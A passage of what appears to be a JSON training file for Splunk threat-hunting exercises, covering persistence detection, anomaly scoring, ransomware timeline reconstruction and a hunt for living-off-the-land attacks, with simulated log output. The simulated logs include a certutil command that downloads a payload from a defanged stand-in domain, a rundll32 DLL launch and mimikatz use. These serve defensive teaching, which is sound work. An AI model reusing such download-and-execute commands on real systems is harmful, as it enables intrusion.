                    "persistence_type": "Service",
                    "host": "WKS-HR-022",
                    "SubjectUserName": "admin_jmorgan"
                  }
                ]
              },
              "finding": "All three created within 4 minutes of each other (2:41-2:45 AM) by admin_jmorgan. This is a coordinated persistence installation!"
            },
            {
              "question": "Verify these executables are malicious. Check if they're calling back to C2.",
              "hint": "Look for network connections from these suspicious paths.",
              "spl": "index=sysmon EventCode=3 | where match(Image, \"(?i)(updater|update|helper)\\.exe\") | stats count, values(DestinationIp) as dest_ips, values(DestinationPort) as dest_ports by Image | where count > 0",
              "analysis": "Check network activity from suspected malicious binaries.",
              "output": {
                "columns": [
                  "Image",
                  "dest_ips",
                  "dest_ports",
                  "count"
                ],
                "rows": [
                  {
                    "Image": "C:\\Users\\Public\\updater.exe",
                    "dest_ips": "185.220.101.54",
                    "dest_ports": "443",
                    "count": "47"
                  },
                  {
                    "Image": "C:\\Windows\\Temp\\update.exe",
                    "dest_ips": "185.220.101.54",
                    "dest_ports": "443",
                    "count": "23"
                  },
                  {
                    "Image": "C:\\ProgramData\\helper.exe",
                    "dest_ips": "185.220.101.54",
                    "dest_ports": "443",
                    "count": "31"
                  }
                ]
              },
              "finding": "Confirmed: All three executables connecting to 185.220.101.54:443 - same C2 identified in beaconing detection!"
            }
          ],
          "conclusion": "<strong>Multiple Persistence Mechanisms Identified!</strong><br><br>\n                    <strong>Registry:</strong> HKLM\\..\\Run\\WindowsUpdater  C:\\Users\\Public\\updater.exe<br>\n                    <strong>Scheduled Task:</strong> GoogleUpdate  C:\\Windows\\Temp\\update.exe (as SYSTEM)<br>\n                    <strong>Service:</strong> WindowsHelper  C:\\ProgramData\\helper.exe<br><br>\n                    <strong>Timeline:</strong> All installed 2:41-2:45 AM by admin_jmorgan (compromised account)<br><br>\n                    <strong>C2:</strong> All executables beacon to 185.220.101.54<br><br>\n                    <strong>Remediation:</strong>\n                    <ol>\n                        <li>Delete registry key, scheduled task, and service</li>\n                        <li>Remove malicious executables from all paths</li>\n                        <li>Verify no other persistence mechanisms exist</li>\n                        <li>Check other systems for same IOCs</li>\n                        <li>Full AV scan and reimage if needed</li>\n                    </ol>"
        }
      },
      {
        "id": "adv-004",
        "title": "Anomaly Scoring",
        "type": "challenge",
        "difficulty": "advanced",
        "duration": "20 min",
        "objectives": [
          "Build composite anomaly scores",
          "Weight multiple indicators",
          "Prioritize investigation targets"
        ],
        "tags": [
          "anomaly-detection",
          "statistics",
          "threat-hunting"
        ],
        "description": "Create a weighted anomaly scoring system to prioritize threats.",
        "content": {
          "problem": "Build an anomaly score for each user based on: (1) failed login ratio, (2) off-hours activity, (3) number of unique systems accessed. Weight factors: failed logins x3, off-hours x2, unique systems x1. Output a normalized 0-100 risk score.",
          "hints": [
            "Calculate each metric separately, then combine",
            "Normalize each metric to 0-1 range before weighting",
            "Use eventstats to get population-wide baselines for normalization"
          ],
          "solution": {
            "spl": "index=wineventlog EventCode IN (4624, 4625)\n| eval hour=strftime(_time, \"%H\")\n| eval off_hours=if(hour<6 OR hour>20, 1, 0)\n| stats count(eval(EventCode=4625)) as failures, count(eval(EventCode=4624)) as successes, sum(off_hours) as off_hour_events, dc(host) as unique_hosts by TargetUserName\n| eval failure_ratio=failures/(failures+successes)\n| eval off_hours_ratio=off_hour_events/(failures+successes)\n| eventstats perc99(failure_ratio) as max_fail, perc99(off_hours_ratio) as max_offhours, perc99(unique_hosts) as max_hosts\n| eval norm_fail=if(failure_ratio>max_fail, 1, failure_ratio/max_fail)\n| eval norm_offhours=if(off_hours_ratio>max_offhours, 1, off_hours_ratio/max_offhours)\n| eval norm_hosts=if(unique_hosts>max_hosts, 1, unique_hosts/max_hosts)\n| eval risk_score=round(((norm_fail*3) + (norm_offhours*2) + (norm_hosts*1)) / 6 * 100, 0)\n| where failures+successes > 10\n| sort -risk_score\n| table TargetUserName, risk_score, failures, successes, failure_ratio, off_hour_events, unique_hosts",
            "explanation": "We calculate three metrics per user, normalize each to 0-1 using percentile capping, apply weights (3, 2, 1), sum and normalize to 0-100. Users with highest composite scores should be investigated first."
          },
          "variations": [
            {
              "description": "Add data volume anomaly as a fourth factor (weight x2):",
              "spl": "... | join TargetUserName [search index=proxy | stats sum(bytes_out) as bytes by user | rename user as TargetUserName] | ... add bytes normalization and scoring ..."
            },
            {
              "description": "Create IP-based risk scoring for firewall traffic:",
              "spl": "index=firewall | stats dc(dest_ip) as unique_dests, dc(dest_port) as unique_ports, sum(bytes_out) as bytes by src_ip | ... normalize and score ..."
            }
          ]
        }
      }
    ],
    "expert": [
      {
        "id": "exp-001",
        "title": "Full Incident Timeline Reconstruction",
        "type": "scenario",
        "difficulty": "expert",
        "duration": "45 min",
        "objectives": [
          "Correlate events across multiple data sources",
          "Build complete attack timeline",
          "Determine full scope of compromise"
        ],
        "tags": [
          "incident-response",
          "timeline",
          "correlation"
        ],
        "description": "Reconstruct a complete attack timeline from initial access to impact.",
        "content": {
          "situation": "Critical alert: Ransomware encryption detected on FILESRV-02 at 4:32 AM. You need to reconstruct the complete attack timeline: initial access, lateral movement, privilege escalation, and impact. Multiple data sources are available: Windows event logs, Sysmon, firewall, proxy, and EDR.",
          "steps": [
            {
              "question": "Start at the end and work backwards. What process executed the ransomware on FILESRV-02?",
              "hint": "Look for file creation or process execution events around 4:32 AM.",
              "spl": "index=sysmon host=\"FILESRV-02\" EventCode IN (1, 11) earliest=\"01/15/2024:04:25:00\" latest=\"01/15/2024:04:35:00\" | eval event_type=case(EventCode=1, \"ProcessCreate\", EventCode=11, \"FileCreate\") | table _time, event_type, Image, ParentImage, TargetFilename, User | sort _time",
              "analysis": "Look for the ransomware execution event.",
              "output": {
                "columns": [
                  "_time",
                  "event_type",
                  "Image",
                  "ParentImage",
                  "TargetFilename",
                  "User"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 04:31:42",
                    "event_type": "ProcessCreate",
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "ParentImage": "C:\\Windows\\System32\\services.exe",
                    "TargetFilename": "-",
                    "User": "SYSTEM"
                  },
                  {
                    "_time": "2024-01-15 04:31:45",
                    "event_type": "ProcessCreate",
                    "Image": "C:\\Windows\\Temp\\locker.exe",
                    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TargetFilename": "-",
                    "User": "SYSTEM"
                  },
                  {
                    "_time": "2024-01-15 04:31:47",
                    "event_type": "FileCreate",
                    "Image": "C:\\Windows\\Temp\\locker.exe",
                    "ParentImage": "-",
                    "TargetFilename": "D:\\Shares\\Finance\\README_ENCRYPTED.txt",
                    "User": "SYSTEM"
                  }
                ],
                "truncated": "Showing 3 of 847 events"
              },
              "finding": "Ransomware \"locker.exe\" launched at 4:31:45 from C:\\Windows\\Temp\\. Parent process: powershell.exe running as SYSTEM. PowerShell was spawned by services.exe - indicates scheduled task or service abuse."
            },
            {
              "question": "How did locker.exe get onto the file server? Check for lateral movement or file drops.",
              "hint": "Look for file creation of locker.exe and network connections to the server.",
              "spl": "index=sysmon host=\"FILESRV-02\" EventCode=11 TargetFilename=\"*locker.exe\" | append [search index=sysmon host=\"FILESRV-02\" EventCode=3 DestinationPort IN (445, 139, 5985)] | sort _time | table _time, EventCode, Image, TargetFilename, SourceIp, DestinationPort, User",
              "analysis": "Track how the ransomware binary arrived.",
              "output": {
                "columns": [
                  "_time",
                  "EventCode",
                  "Image",
                  "TargetFilename",
                  "SourceIp",
                  "DestinationPort",
                  "User"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 04:14:22",
                    "EventCode": "3",
                    "Image": "System",
                    "TargetFilename": "-",
                    "SourceIp": "10.10.25.44",
                    "DestinationPort": "5985",
                    "User": "SYSTEM"
                  },
                  {
                    "_time": "2024-01-15 04:14:25",
                    "EventCode": "3",
                    "Image": "C:\\Windows\\System32\\wsmprovhost.exe",
                    "TargetFilename": "-",
                    "SourceIp": "10.10.25.44",
                    "DestinationPort": "5985",
                    "User": "admin_rthompson"
                  },
                  {
                    "_time": "2024-01-15 04:15:03",
                    "EventCode": "11",
                    "Image": "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
                    "TargetFilename": "C:\\Windows\\Temp\\locker.exe",
                    "SourceIp": "-",
                    "DestinationPort": "-",
                    "User": "SYSTEM"
                  }
                ]
              },
              "finding": "locker.exe created at 4:15 AM by wmiprvse.exe (WMI). Inbound WMI connection (port 5985) from 10.10.25.44 at 4:14. That's the source of lateral movement!"
            },
            {
              "question": "What happened on 10.10.25.44 before it attacked the file server? This is likely patient zero.",
              "hint": "Look for suspicious activity on the attacking workstation.",
              "spl": "index=sysmon host=\"10.10.25.44\" earliest=\"01/15/2024:00:00:00\" latest=\"01/15/2024:04:30:00\" EventCode IN (1, 3, 11) | where NOT match(Image, \"(?i)(svchost|csrss|lsass|explorer|chrome|edge)\") | stats count by Image, ParentImage | sort -count | head 20",
              "analysis": "Profile unusual process activity on patient zero.",
              "output": {
                "columns": [
                  "Image",
                  "ParentImage",
                  "count"
                ],
                "rows": [
                  {
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "count": "47"
                  },
                  {
                    "Image": "C:\\Users\\rthompson\\AppData\\Local\\Temp\\mimikatz.exe",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "count": "12"
                  },
                  {
                    "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "count": "8"
                  },
                  {
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "count": "6"
                  }
                ],
                "truncated": "Showing 4 of 20 results"
              },
              "finding": "Suspicious activity: mimikatz.exe, powershell encoded commands, wmic.exe remote execution. Classic attack toolkit. Earliest malicious activity: 1:47 AM."
            },
            {
              "question": "How was 10.10.25.44 initially compromised? Check for phishing or external access.",
              "hint": "Look at email, web browsing, or VPN access for the user of that workstation.",
              "spl": "index=proxy src_ip=\"10.10.25.44\" earliest=\"01/14/2024:08:00:00\" latest=\"01/15/2024:02:00:00\" | where match(url, \"(?i)(\\.exe|\\.dll|\\.zip|\\.js|\\.hta)\") OR category=\"malware\" | table _time, url, content_type, bytes, category, user",
              "analysis": "Look for initial payload download.",
              "output": {
                "columns": [
                  "_time",
                  "url",
                  "content_type",
                  "bytes",
                  "category",
                  "user"
                ],
                "rows": [
                  {
                    "_time": "2024-01-14 23:47:15",
                    "url": "hxxps://malicious-site[.]com/docs/invoice_12847.zip",
                    "content_type": "application/zip",
                    "bytes": "245760",
                    "category": "uncategorized",
                    "user": "rthompson"
                  },
                  {
                    "_time": "2024-01-14 23:52:08",
                    "url": "hxxps://cdn-payload[.]com/update.dll",
                    "content_type": "application/octet-stream",
                    "bytes": "524288",
                    "category": "malware",
                    "user": "rthompson"
                  }
                ]
              },
              "finding": "At 11:47 PM on Jan 14, user rthompson downloaded \"invoice_12847.zip\" from hxxps://malicious-site[.]com. EDR logs show the ZIP contained a macro-enabled document."
            },
            {
              "question": "Map all systems the attacker touched. What's the full scope?",
              "hint": "Track all lateral movement from patient zero using authentication and network logs.",
              "spl": "index=wineventlog EventCode=4624 LogonType=3 IpAddress=\"10.10.25.44\" earliest=\"01/15/2024:00:00:00\" | append [search index=sysmon EventCode=3 SourceIp=\"10.10.25.44\" earliest=\"01/15/2024:00:00:00\" | where match(DestinationPort, \"(445|139|5985|5986|3389)\")] | stats earliest(_time) as first_access, latest(_time) as last_access, dc(DestinationPort) as ports by ComputerName, TargetUserName | sort first_access",
              "analysis": "Full lateral movement map.",
              "output": {
                "columns": [
                  "ComputerName",
                  "TargetUserName",
                  "first_access",
                  "last_access",
                  "ports"
                ],
                "rows": [
                  {
                    "ComputerName": "WKS-FIN-04",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 02:15:22",
                    "last_access": "2024-01-15 02:18:45",
                    "ports": "2"
                  },
                  {
                    "ComputerName": "WKS-HR-22",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 02:22:08",
                    "last_access": "2024-01-15 02:25:33",
                    "ports": "1"
                  },
                  {
                    "ComputerName": "FILESRV-01",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 02:45:17",
                    "last_access": "2024-01-15 03:12:44",
                    "ports": "2"
                  },
                  {
                    "ComputerName": "DC-CORP-01",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 02:48:55",
                    "last_access": "2024-01-15 03:47:22",
                    "ports": "3"
                  },
                  {
                    "ComputerName": "SQLDB-PROD",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 03:15:08",
                    "last_access": "2024-01-15 03:45:19",
                    "ports": "2"
                  },
                  {
                    "ComputerName": "BACKUP-01",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 03:52:33",
                    "last_access": "2024-01-15 04:02:11",
                    "ports": "1"
                  },
                  {
                    "ComputerName": "FILESRV-02",
                    "TargetUserName": "admin_rthompson",
                    "first_access": "2024-01-15 04:14:22",
                    "last_access": "2024-01-15 04:31:45",
                    "ports": "2"
                  }
                ]
              },
              "finding": "Attacker accessed 7 systems: WKS-FIN-04, WKS-HR-22, FILESRV-01, FILESRV-02, DC-CORP-01, SQLDB-PROD, BACKUP-01. Domain controller was compromised!"
            }
          ],
          "conclusion": "<strong>Complete Attack Timeline Reconstructed</strong><br><br>\n                    <table style=\"width:100%; border-collapse: collapse;\">\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>11:47 PM Jan 14</strong></td><td style=\"padding:4px; border:1px solid #333;\">Initial Access - Phishing email opened by rthompson</td></tr>\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>11:52 PM</strong></td><td style=\"padding:4px; border:1px solid #333;\">Malware execution on 10.10.25.44</td></tr>\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>1:47 AM Jan 15</strong></td><td style=\"padding:4px; border:1px solid #333;\">Credential harvesting (mimikatz)</td></tr>\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>2:15 AM</strong></td><td style=\"padding:4px; border:1px solid #333;\">Lateral movement begins</td></tr>\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>2:45 AM</strong></td><td style=\"padding:4px; border:1px solid #333;\">Domain controller compromised</td></tr>\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>3:30 AM</strong></td><td style=\"padding:4px; border:1px solid #333;\">Ransomware staged on file servers</td></tr>\n                    <tr><td style=\"padding:4px; border:1px solid #333;\"><strong>4:31 AM</strong></td><td style=\"padding:4px; border:1px solid #333;\">Ransomware executed (encryption begins)</td></tr>\n                    </table><br>\n                    <strong>Affected Systems:</strong> 7 systems including DC and file servers<br>\n                    <strong>Root Cause:</strong> Phishing email with malicious attachment<br>\n                    <strong>Compromised Accounts:</strong> rthompson, admin_rthompson, domain admin account"
        }
      },
      {
        "id": "exp-002",
        "title": "Advanced Threat Hunt: Multi-Stage Attack",
        "type": "scenario",
        "difficulty": "expert",
        "duration": "40 min",
        "objectives": [
          "Hunt for stealthy attack patterns",
          "Correlate weak signals into strong indicators",
          "Identify living-off-the-land techniques"
        ],
        "tags": [
          "threat-hunting",
          "apt",
          "lolbins"
        ],
        "description": "Hunt for a sophisticated attacker using legitimate tools to evade detection.",
        "content": {
          "situation": "Threat intel reports APT group \"ShadowBear\" is targeting organizations in your sector. Their TTP includes: living-off-the-land binaries, memory-only malware, and slow beaconing. No alerts have fired, but you should hunt proactively.",
          "steps": [
            {
              "question": "Start with LOLBin hunting. Find unusual parent-child process relationships for Windows utilities.",
              "hint": "Look for legitimate tools (certutil, bitsadmin, mshta) with unusual parent processes.",
              "spl": "index=sysmon EventCode=1 Image IN (\"*\\\\certutil.exe\", \"*\\\\bitsadmin.exe\", \"*\\\\mshta.exe\", \"*\\\\regsvr32.exe\", \"*\\\\rundll32.exe\", \"*\\\\msiexec.exe\") | where NOT match(ParentImage, \"(?i)(explorer|services|svchost|cmd|powershell)\") | stats count, values(CommandLine) as commands by Image, ParentImage, User | sort -count",
              "analysis": "Find LOLBins spawned by unusual parents.",
              "output": {
                "columns": [
                  "Image",
                  "ParentImage",
                  "User",
                  "commands",
                  "count"
                ],
                "rows": [
                  {
                    "Image": "C:\\Windows\\System32\\certutil.exe",
                    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    "User": "jsmith",
                    "commands": "certutil -urlcache -split -f hxxps://cdn-update[.]com/font.txt C:\\Users\\jsmith\\AppData\\Local\\Temp\\font.txt",
                    "count": "3"
                  },
                  {
                    "Image": "C:\\Windows\\System32\\rundll32.exe",
                    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    "User": "mwilson",
                    "commands": "rundll32.exe C:\\Users\\mwilson\\AppData\\Local\\Temp\\update.dll,Initialize",
                    "count": "2"
                  }
                ]
              },
              "finding": "Suspicious: certutil.exe spawned by WINWORD.EXE on 3 systems. This indicates Office macro downloading payloads using certutil."
            },
            {
              "question": "Check what certutil was downloading. Look for URL connections or decode operations.",
              "hint": "Parse the certutil command line for URLs or file operations.",
              "spl": "index=sysmon EventCode=1 Image=\"*\\\\certutil.exe\" ParentImage=\"*\\\\WINWORD.EXE\" | rex field=CommandLine \"(?<url>https?://[^\\s]+)\" | rex field=CommandLine \"-decode\\s+(?<encoded_file>[^\\s]+)\\s+(?<decoded_file>[^\\s]+)\" | table _time, host, User, url, encoded_file, decoded_file, CommandLine",
              "analysis": "Extract the payload details.",
              "output": {
                "columns": [
                  "_time",
                  "host",
                  "User",
                  "url",
                  "encoded_file",
                  "decoded_file"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 09:23:17",
                    "host": "WKS-SALES-04",
                    "User": "jsmith",
                    "url": "hxxps://cdn-update[.]com/font.txt",
                    "encoded_file": "-",
                    "decoded_file": "-"
                  },
                  {
                    "_time": "2024-01-15 09:23:45",
                    "host": "WKS-SALES-04",
                    "User": "jsmith",
                    "url": "-",
                    "encoded_file": "C:\\...\\Temp\\font.txt",
                    "decoded_file": "C:\\...\\Temp\\update.dll"
                  },
                  {
                    "_time": "2024-01-15 10:15:33",
                    "host": "WKS-MKT-07",
                    "User": "mwilson",
                    "url": "hxxps://cdn-update[.]com/font.txt",
                    "encoded_file": "-",
                    "decoded_file": "-"
                  },
                  {
                    "_time": "2024-01-15 11:42:08",
                    "host": "WKS-HR-12",
                    "User": "pjones",
                    "url": "hxxps://cdn-update[.]com/font.txt",
                    "encoded_file": "-",
                    "decoded_file": "-"
                  }
                ]
              },
              "finding": "certutil downloading from hxxps://cdn-update[.]com/font.txt and decoding to C:\\Users\\[user]\\AppData\\Local\\Temp\\update.dll. Classic base64 encoded payload technique!"
            },
            {
              "question": "Track the downloaded DLL. How is it being executed?",
              "hint": "Look for rundll32 or regsvr32 loading this DLL.",
              "spl": "index=sysmon (EventCode=1 Image=\"*rundll32.exe\" CommandLine=\"*update.dll*\") OR (EventCode=7 ImageLoaded=\"*update.dll*\") | table _time, host, EventCode, Image, ImageLoaded, CommandLine, User | sort _time",
              "analysis": "Track DLL execution.",
              "output": {
                "columns": [
                  "_time",
                  "host",
                  "EventCode",
                  "Image",
                  "ImageLoaded",
                  "CommandLine",
                  "User"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 09:24:02",
                    "host": "WKS-SALES-04",
                    "EventCode": "1",
                    "Image": "C:\\Windows\\System32\\rundll32.exe",
                    "ImageLoaded": "-",
                    "CommandLine": "rundll32.exe update.dll,Initialize",
                    "User": "jsmith"
                  },
                  {
                    "_time": "2024-01-15 09:24:05",
                    "host": "WKS-SALES-04",
                    "EventCode": "7",
                    "Image": "C:\\Windows\\System32\\svchost.exe",
                    "ImageLoaded": "C:\\...\\Temp\\update.dll",
                    "CommandLine": "-",
                    "User": "SYSTEM"
                  }
                ]
              },
              "finding": "rundll32.exe loading update.dll with export function \"Initialize\". DLL also loaded by svchost.exe - indicates process injection!"
            },
            {
              "question": "Check for process injection indicators. Look for suspicious memory operations.",
              "hint": "Sysmon EventCode 8 (CreateRemoteThread) and 10 (ProcessAccess) show injection.",
              "spl": "index=sysmon EventCode IN (8, 10) SourceImage=\"*\\\\svchost.exe\" | where NOT match(TargetImage, \"(?i)(svchost|csrss|lsass|services)\") | stats count, values(TargetImage) as targets by SourceImage, GrantedAccess | where count > 0",
              "analysis": "Detect process injection.",
              "output": {
                "columns": [
                  "SourceImage",
                  "GrantedAccess",
                  "targets",
                  "count"
                ],
                "rows": [
                  {
                    "SourceImage": "C:\\Windows\\System32\\svchost.exe",
                    "GrantedAccess": "0x1F0FFF",
                    "targets": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
                    "count": "12"
                  }
                ]
              },
              "finding": "svchost.exe injecting into multiple processes including chrome.exe, teams.exe. GrantedAccess 0x1F0FFF indicates full process access - this is malware!"
            },
            {
              "question": "The malware is hiding in legitimate processes. Hunt for its C2 communication.",
              "hint": "Look for unusual network connections from processes that normally don't connect to the internet.",
              "spl": "index=sysmon EventCode=3 Image IN (\"*\\\\svchost.exe\", \"*\\\\chrome.exe\") | where NOT match(DestinationIp, \"^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[0-1]))\") | stats count, dc(DestinationIp) as unique_dests, values(DestinationIp) as dest_ips by Image, host | where unique_dests > 5 AND unique_dests < 20",
              "analysis": "Find C2 connections from injected processes.",
              "output": {
                "columns": [
                  "Image",
                  "host",
                  "unique_dests",
                  "dest_ips",
                  "count"
                ],
                "rows": [
                  {
                    "Image": "C:\\Windows\\System32\\svchost.exe",
                    "host": "WKS-SALES-04",
                    "unique_dests": "8",
                    "dest_ips": "185.220.101.54, 91.219.237.99, 45.33.32.156, 104.21.44.108, 172.67.182.31, 23.227.38.65, 143.204.215.14, 52.84.150.11",
                    "count": "156"
                  },
                  {
                    "Image": "C:\\Windows\\System32\\svchost.exe",
                    "host": "WKS-MKT-07",
                    "unique_dests": "6",
                    "dest_ips": "185.220.101.54, 91.219.237.99, 104.21.44.108, 172.67.182.31, 23.227.38.65, 143.204.215.14",
                    "count": "89"
                  }
                ]
              },
              "finding": "Injected svchost.exe connecting to 8 unique IPs, all on port 443. One IP matches \"cdn-update[.]com\" - the same domain used for payload delivery. C2 confirmed!"
            }
          ],
          "conclusion": "<strong>APT Activity Confirmed</strong><br><br>\n                    <strong>Attack Chain Identified:</strong>\n                    <ol>\n                        <li>Phishing document with macro</li>\n                        <li>LOLBin abuse (certutil for download)</li>\n                        <li>Encoded payload delivery</li>\n                        <li>DLL execution via rundll32</li>\n                        <li>Process injection for stealth</li>\n                        <li>C2 via injected legitimate processes</li>\n                    </ol><br>\n                    <strong>IOCs Identified:</strong>\n                    <ul>\n                        <li>Domain: cdn-update[.]com</li>\n                        <li>File: update.dll (various hashes per host)</li>\n                        <li>Behavior: certutil spawned by Office applications</li>\n                        <li>Behavior: svchost.exe with unusual network connections</li>\n                    </ul><br>\n                    <strong>Affected Hosts:</strong> 3 workstations confirmed, hunt for more using IOCs"
        }
      },
      {
        "id": "exp-003",
        "title": "Performance Optimization Challenge",
        "type": "challenge",
        "difficulty": "expert",
        "duration": "25 min",
        "objectives": [
          "Optimize slow-running searches",
          "Reduce search job resource consumption",
          "Apply SPL best practices"
        ],
        "tags": [
          "performance",
          "optimization",
          "best-practices"
        ],
        "description": "Take a slow search and make it fast without changing the results.",
        "content": {
          "problem": "The following search takes 45 minutes to run and times out. Optimize it to complete in under 2 minutes while returning the same results:\n\n```\nindex=* | eval threat_indicator=if(match(src_ip, \"185\\.220\\..*\") OR match(dest_ip, \"185\\.220\\..*\"), \"yes\", \"no\") | search threat_indicator=\"yes\" | join src_ip [search index=asset_inventory | table ip, hostname, owner] | where isnotnull(hostname) | stats count by src_ip, dest_ip, hostname, owner | sort -count\n```",
          "hints": [
            "Never start with index=* - specify the actual index",
            "Move filtering before eval where possible",
            "Replace join with lookup for better performance",
            "Filter before aggregating, not after"
          ],
          "solution": {
            "spl": "index=firewall (src_ip=\"185.220.*\" OR dest_ip=\"185.220.*\")\n| lookup asset_inventory ip as src_ip OUTPUT hostname, owner\n| where isnotnull(hostname)\n| stats count by src_ip, dest_ip, hostname, owner\n| sort -count",
            "explanation": "Optimizations applied:\n1. **Specify index**: Changed from \"index=*\" to \"index=firewall\" - huge reduction in data scanned\n2. **Push filtering left**: Moved IP filter into the base search instead of eval+search\n3. **Use wildcard efficiently**: \"185.220.*\" in search is faster than regex in eval\n4. **Replace join with lookup**: Lookups are orders of magnitude faster than joins for enrichment\n5. **Removed unnecessary eval**: threat_indicator column was never used after filtering"
          },
          "variations": [
            {
              "description": "Alternative using tstats for even faster execution (if data model exists):",
              "spl": "| tstats count from datamodel=Network_Traffic where (All_Traffic.src_ip=\"185.220.*\" OR All_Traffic.dest_ip=\"185.220.*\") by All_Traffic.src_ip, All_Traffic.dest_ip | rename All_Traffic.* as * | lookup asset_inventory ip as src_ip OUTPUT hostname, owner | where isnotnull(hostname)"
            },
            {
              "description": "If you need to run across all indexes, use targeted OR:",
              "spl": "index=firewall OR index=proxy (src_ip=\"185.220.*\" OR dest_ip=\"185.220.*\") | ..."
            }
          ]
        }
      }
    ],
    "enterpriseSecurity": [
      {
        "id": "es-001",
        "title": "ES for Splunk Users: What Changes",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "20 min",
        "objectives": [
          "Understand how ES layers on top of Splunk",
          "Learn the key mental shifts for ES",
          "Know when to use ES tools vs raw SPL"
        ],
        "tags": [
          "es",
          "transition",
          "fundamentals"
        ],
        "description": "The essential orientation for Splunk users moving to Enterprise Security. Learn what's different and what stays the same.",
        "content": {
          "sections": [
            {
              "title": "ES is a Layer, Not a Replacement",
              "body": "<p>The most important thing to understand: <strong>Enterprise Security runs ON TOP of Splunk</strong>. Everything you know still works.</p>\n                        <p>ES adds:</p>\n                        <ul>\n                            <li><strong>Data Models</strong>  Pre-normalized, accelerated data for fast searching</li>\n                            <li><strong>Notable Events</strong>  A workflow system for managing alerts</li>\n                            <li><strong>Risk Framework</strong>  Accumulated risk scores per user/host instead of individual alerts</li>\n                            <li><strong>Dashboards & Workflows</strong>  Pre-built security interfaces</li>\n                        </ul>\n                        <p>Your raw SPL skills are still valuable. ES just gives you additional, optimized tools.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "The Data Model Shift",
              "body": "<p>In standard Splunk, you search raw indexes:</p>\n                        <pre class=\"spl-example\">index=wineventlog EventCode=4625</pre>\n                        <p>In ES, the same data is normalized into <strong>data models</strong>. You search the model instead:</p>",
              "spl": "| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by Authentication.user, Authentication.src",
              "explanation": "This searches the accelerated Authentication data model. It's faster AND the field names are standardized across all data sources."
            },
            {
              "title": "Why Data Models Matter",
              "body": "<p>Data models solve the \"every vendor is different\" problem:</p>\n                        <table style=\"width:100%; border-collapse: collapse; margin: 1rem 0;\">\n                            <tr style=\"border-bottom: 1px solid var(--border-subtle);\">\n                                <th style=\"text-align:left; padding: 0.5rem;\">Data Source</th>\n                                <th style=\"text-align:left; padding: 0.5rem;\">Raw Field</th>\n                                <th style=\"text-align:left; padding: 0.5rem;\">CIM Field</th>\n                            </tr>\n                            <tr><td style=\"padding: 0.5rem;\">Windows</td><td>TargetUserName</td><td>user</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Linux</td><td>USER</td><td>user</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Okta</td><td>actor.alternateId</td><td>user</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">AWS</td><td>userIdentity.userName</td><td>user</td></tr>\n                        </table>\n                        <p>One search, all sources. That's the power of normalization.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "When to Use What",
              "body": "<p>Use <strong>ES data models (tstats)</strong> when:</p>\n                        <ul>\n                            <li>You need speed on large time ranges</li>\n                            <li>You're searching across multiple data sources</li>\n                            <li>You don't need access to raw event details</li>\n                        </ul>\n                        <p>Use <strong>raw index searches</strong> when:</p>\n                        <ul>\n                            <li>You need fields not in the data model</li>\n                            <li>You're troubleshooting specific events</li>\n                            <li>Data model acceleration is incomplete</li>\n                        </ul>\n                        <p><strong>Pro tip:</strong> Start with tstats for the big picture, drill down to raw events for details.</p>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "es-002",
        "title": "Notable Events: Your New Alert Queue",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "20 min",
        "objectives": [
          "Understand what notable events are",
          "Learn the notable workflow states",
          "Query and manage notables with SPL"
        ],
        "tags": [
          "es",
          "notable",
          "workflow",
          "alerts"
        ],
        "description": "In standard Splunk you have alerts. In ES, you have notable events  a complete workflow system for security operations.",
        "content": {
          "sections": [
            {
              "title": "Alerts vs Notable Events",
              "body": "<p>In standard Splunk, an alert fires and maybe sends an email. That's it.</p>\n                        <p>In ES, alerts create <strong>notable events</strong>  tracked security incidents with:</p>\n                        <ul>\n                            <li><strong>Status</strong>  New, In Progress, Pending, Resolved, Closed</li>\n                            <li><strong>Owner</strong>  Assigned analyst</li>\n                            <li><strong>Urgency</strong>  Critical, High, Medium, Low, Informational</li>\n                            <li><strong>Comments</strong>  Investigation notes and audit trail</li>\n                        </ul>\n                        <p>Think of it as a ticketing system built into Splunk.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Where Notables Live",
